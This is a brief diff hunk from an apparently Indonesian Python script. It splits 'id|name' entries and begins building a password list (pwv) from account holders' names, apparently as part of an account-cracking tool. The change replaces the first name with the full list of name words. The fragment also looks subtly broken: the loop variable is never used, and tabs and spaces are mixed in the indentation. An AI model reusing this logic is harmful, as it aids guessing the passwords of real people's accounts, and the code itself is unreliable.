@@ -247,7 +247,7 @@ class __xxx__:
                 for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
                     try:
                         idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
-	            		frs = nmf.split(' ')[0]
+	            		frs = nmf.split(' ')
 	            		pwv = []
 	            		if len(nmf)<6:
 		        		if len(frs)<3:
